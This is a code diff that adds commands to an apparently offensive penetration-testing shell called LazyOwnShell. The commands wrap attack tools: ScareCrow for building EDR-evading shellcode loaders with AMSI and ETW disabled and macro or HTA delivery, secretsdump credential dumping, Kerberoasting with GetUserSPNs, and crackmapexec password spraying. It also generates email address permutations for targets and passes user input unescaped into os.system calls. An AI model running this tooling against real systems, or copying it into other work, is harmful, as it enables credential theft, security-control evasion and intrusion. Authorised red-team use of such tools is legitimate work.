@@ -10913,6 +10913,340 @@ class LazyOwnShell(Cmd):
             print_error("Invalid input. Please enter a valid number.")
         return
 
+    def do_scarecrow(self, line):
+        """
+        Executes ScareCrow with various options for bypassing EDR solutions and executing shellcode.
+        to create the shellcode.bin you need run venom or run lazymsfvenom, or run msfvenom yourself :D
+        :param line: Not used directly but reserved for future use.
+        :returns: None
+        """
+        if not is_binary_present("ScareCrow"):
+            print_warn("ScareCrow is not installed. Installing dependencies and building ScareCrow.")
+            os.system("sudo apt-get install -y golang osslsigncode mingw-w64")
+            os.system("go get github.com/fatih/color")
+            os.system("go get github.com/yeka/zip")
+            os.system("go get github.com/josephspurrier/goversioninfo")
+            os.system("mkdir -p ~/bypass && cd ~/bypass && git clone https://github.com/optiv/ScareCrow && cd ScareCrow && go build ScareCrow.go")
+            
+            command = """
+            if [[ "$SHELL" == */bash ]]; then
+                echo 'export PATH=$PATH:~/bypass/ScareCrow' >> ~/.bashrc
+            elif [[ "$SHELL" == */zsh ]]; then
+                echo 'export PATH=$PATH:~/bypass/ScareCrow' >> ~/.zshrc
+            fi
+            """
+            os.system(command)
+
+        print_warn("Select the mode you want to use:")
+        options = [
+            "Evasion (Disk, KnownDLL, None)", 
+            "Exec (RtlCopy, ProcessInjection, NtQueueApcThreadEx, VirtualAlloc)",
+            "Loader (binary, control, dll, excel, msiexec, wscript)", 
+            "Clone Cert", 
+            "Custom Config File",
+            "Enable Console Mode", 
+            "Delivery (bits, hta, macro)", 
+            "Domain Cert", 
+            "Encryption Mode (AES, ELZMA, RC4)",
+            "Export (DLL)", 
+            "Injection Path", 
+            "Disable AMSI", 
+            "Disable ETW", 
+            "Disable Signing", 
+            "Disable Sleep Delay",
+            "Obfuscation", 
+            "Set Output Path", 
+            "Sandbox Evasion", 
+            "Set URL", 
+            "Set Valid Cert"
+        ]
+        
+        for i, option in enumerate(options, start=1):
+            print_msg(f"{i}. {option}")
+
+        try:
+            choice = int(input("    [!] Enter the number corresponding to the option: ")) - 1
+            if choice < 0 or choice >= len(options):
+                print_error("Invalid choice. Please select a valid number.")
+                return
+
+            scarecrow_command = "ScareCrow"
+
+            if choice == 0:
+                evasion = input("    [!] Enter Evasion type (Disk/KnownDLL/None) [default: Disk]: ").strip() or "Disk"
+                scarecrow_command += f" -Evasion {evasion}"
+
+            if choice == 1:
+                exec_method = input("    [!] Enter Exec method (RtlCopy/ProcessInjection/NtQueueApcThreadEx/VirtualAlloc) [default: RtlCopy]: ").strip() or "RtlCopy"
+                scarecrow_command += f" -Exec {exec_method}"
+
+            if choice == 2:
+                loader = input("    [!] Enter Loader type (binary/control/dll/excel/msiexec/wscript) [default: binary]: ").strip() or "binary"
+                scarecrow_command += f" -Loader {loader}"
+
+                if loader in ["binary", "dll"]:
+                    shellcode_path = input("    [!] Enter the path to the raw 64-bit shellcode [default: /path/to/shellcode]: ").strip() or "sessions/shellcode.bin"
+                    scarecrow_command += f" -I {shellcode_path}"
+
+                if loader not in ["binary", "dll"]:
+                    output_name = input("    [!] Enter the output file name (e.g., loader.js or loader.hta) [default: loader.js]: ").strip() or "loader.js"
+                    scarecrow_command += f" -O sessions/{output_name}"
+
+                if loader in ["control", "excel", "wscript"]:
+                    delivery = input("    [!] Enter delivery method (bits/hta/macro) [default: bits]: ").strip() or "bits"
+                    scarecrow_command += f" -delivery {delivery}"
+                    if delivery == "hta" and loader in ["binary", "dll"]:
+                        print_error("Binary and DLL loaders are not compatible with HTA delivery.")
+                        return
+                scarecrow_command += f" -domain meta.com"
+            if choice == 7:
+                delivery = input("    [!] Enter delivery method (bits/hta/macro): ").strip()
+                scarecrow_command += f" -delivery {delivery}"
+
+            if choice == 8:
+                encryption = input("    [!] Enter encryption mode (AES/ELZMA/RC4): ").strip()
+                scarecrow_command += f" -encryptionmode {encryption}"
+
+            if choice == 19:
+                url = input("    [!] Enter the url [default: meta.com]: ").strip() or "meta.com"
+                scarecrow_command += f" -url https://{url}"
+
+            print_msg(f"Running ScareCrow with command: {scarecrow_command}")
+            os.system(scarecrow_command)
+
+        except ValueError:
+            print_error("Invalid input. Please enter a valid number.")
+        return
+
+    def do_createmail(self, line):
+        """
+        Generate email permutations based on a full name and domain, then save them to a file.
+
+        This function prompts the user for a full name and domain, generates various email
+        permutations based on that information, and saves the results in a text file located
+        in the `sessions` directory.
+
+        Parameters:
+        line (str): used as Fullname.
+
+        Internal Variables:
+        full_name (str): The full name entered by the user, defaulting to 'John Doe'.
+        domain (str): The domain entered by the user, defaulting to 'example.com'.
+
+        Returns:
+        None
+
+        Example Usage:
+        - To generate emails using default values: `createmail`
+        - To specify a full name and domain: `createmail`
+
+        Note:
+        - The generated emails will be stored in a file named `emails_{full_name}_{domain}.txt`
+          within the `sessions` directory.
+        """
+        url = self.params["url"]
+        domain_def = get_domain(url)
+        if not line:
+            full_name = input("Enter full name (default: John Doe): ") or "John Doe"
+        else:
+            full_name = line
+
+        domain = input("Enter domain (default: example.com): ") or domain_def
+        print_error(domain)
+        emails = generate_emails(full_name, domain)
+        file_name = f"emails_{full_name.replace(' ', '_')}_{domain}.txt"
+        file_path = os.path.join("sessions", file_name)
+            
+        with open(file_path, 'w') as f:
+            for email in emails:
+                f.write(email + '\n')
+
+        print_msg(f"Emails have been saved to {file_path}")
+        os.system(f"cat {file_path}")
+        return
+
+    def do_eyewitness(self, line):
+        """
+        Executes EyeWitness to capture screenshots from a list of URLs. 
+        You need to provide a file containing URLs or a single URL to capture.
+        :param line: Not used directly but reserved for future use.
+        :returns: None
+        """
+        if not is_binary_present("eyewitness"):
+            print_warn("EyeWitness is not installed. Installing dependencies.")
+            os.system("sudo apt install eyewitness -y")
+
+        print_warn("Select the input option for EyeWitness:")
+        options = [
+            "File containing URLs", 
+            "Single URL"
+        ]
+
+        for i, option in enumerate(options, start=1):
+            print_msg(f"{i}. {option}")
+
+        try:
+            choice = int(input("    [!] Enter the number corresponding to the option: ")) - 1
+            if choice < 0 or choice >= len(options):
+                print_error("Invalid choice. Please select a valid number.")
+                return
+
+            eyewitness_command = "/usr/share/eyewitness/EyeWitness.py"
+
+            if choice == 0:
+                file_path = input("    [!] Enter the path to the file containing URLs: ").strip()
+                eyewitness_command += f" -f {file_path}"
+
+            elif choice == 1:
+                url = self.params["url"]
+                single_url = input("    [!] Enter the single URL: (default url in payload.json)").strip() or url
+                eyewitness_command += f" --single {single_url}"
+
+            if input("    [!] Do you want to specify a timeout (default: 7 seconds)? (y/n): ").strip().lower() == 'y':
+                timeout = input("    [!] Enter timeout in seconds: ").strip()
+                eyewitness_command += f" --timeout {timeout}"
+
+            
+            output_dir = input("    [!] Enter output directory name: (default: sessions)").strip() or "sessions"
+            eyewitness_command += f" -d {output_dir}"
+            eyewitness_command += f" --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'"
+            eyewitness_command += " --show-selenium"
+            #eyewitness_command += " --firefox-binary /usr/bin/firefox-esr"
+            print_msg(f"Running EyeWitness with command: {eyewitness_command}")
+            os.system(eyewitness_command)
+
+        except ValueError:
+            print_error("Invalid input. Please enter a valid number.")
+        return    
+
+    def do_secretsdump(self, line):
+        """Run secretsdump.py with the provided domain, username, password, and IP address.
+
+        :param line: This parameter is not used in the function but can be reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually run `secretsdump.py`, use the following command:
+
+            secretsdump.py <domain>/<username>:<password>@<ip_address>
+
+        This function prompts the user for domain, username, password, and IP address.
+        """
+        if not is_binary_present("secretsdump.py"):
+            print_warn("secretsdump.py is not installed. Installing dependencies.")
+            os.system("sudo apt install impacket -y")
+
+        print_msg("Gathering credentials for secretsdump.py execution...")
+        url = self.params["url"]
+        rhost = self.params["rhost"]
+        dominio = get_domain(url)
+        domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
+
+        path_cred = "sessions/credentials.txt"        
+       
+        if not os.path.exists(path_cred):
+            username = input("    [!] Username: ").strip()
+            password = input("    [!] Password: ").strip()
+        else:
+            with open(path_cred, "r") as file:
+                for file_line in file:
+                    params = file_line.split(":")
+                    if not line:
+                        username = params[0]
+                    else:
+                        username = line
+                    password = params[1].replace("\n", "")
+
+        ip_address = input(f"    [!] IP Address: (default: {rhost})").strip() or rhost
+
+        command = f"secretsdump.py {domain}/{username}:{password}@{ip_address}"
+        print_msg(f"Executing command: {command}")
+
+        os.system(command)
+
+        return
+
+    def do_getuserspns(self, line):
+        """Run GetUserSPNs.py with the provided domain, username, password, and IP address.
+
+        :param line: This parameter is not used in the function but can be reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually run `GetUserSPNs.py`, use the following command:
+
+            GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP of DC> -request
+
+        This function prompts the user for domain, username, password, and IP address.
+        """
+        if not is_binary_present("GetUserSPNs.py"):
+            print_warn("GetUserSPNs.py is not installed. Installing dependencies.")
+            os.system("sudo apt install impacket -y")
+
+        print_msg("Gathering credentials for GetUserSPNs.py execution...")
+        url = self.params["url"]
+        rhost = self.params["rhost"]
+        dominio = get_domain(url)
+        domain = input(f"    [!] Domain: (default: {dominio}) ").strip() or dominio
+
+        path_cred = "sessions/credentials.txt"        
+
+        if not os.path.exists(path_cred):
+            username = input("    [!] Username: ").strip()
+            password = input("    [!] Password: ").strip()
+        else:
+            with open(path_cred, "r") as file:
+                for file_line in file:
+                    params = file_line.split(":")
+                    if not line:
+                        username = params[0]
+                    else:
+                        username = line
+                    password = params[1].replace("\n", "")
+
+        ip_address = input(f"    [!] IP Address: (default: {rhost}) ").strip() or rhost
+
+        command = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {ip_address} -request"
+        print_msg(f"Executing command: {command}")
+
+        os.system(command)
+
+        return
+
+    def do_passwordspray(self, line):
+        """Perform password spraying using crackmapexec with the provided parameters.
+
+        :param line: This parameter is not used in the function but can be reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually run `crackmapexec` for password spraying, use the following command:
+
+            crackmapexec smb <IP Address> -u <users_file> -p <password> --continue-on-success
+
+        This function prompts the user for IP address, user file, and password.
+        """
+        if not is_binary_present("crackmapexec"):
+            print_warn("crackmapexec is not installed. Installing dependencies.")
+            os.system("sudo apt install crackmapexec -y")
+        rhost = self.params["rhost"]
+        print_msg("Gathering parameters for password spraying with crackmapexec...")
+
+        ip_address = input("    [!] Enter the IP Address of your target: ").strip() or rhost
+        users_file = input("    [!] Enter the location of your users.txt file: ").strip() or "sessions/users.txt"
+        password = input("    [!] Enter the password you want to spray at the users: ").strip()
+
+        command = f"crackmapexec smb {ip_address} -u {users_file} -p {password} --continue-on-success"
+        print_msg(f"Executing command: {command}")
+
+        os.system(command)
+
+        return
+
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
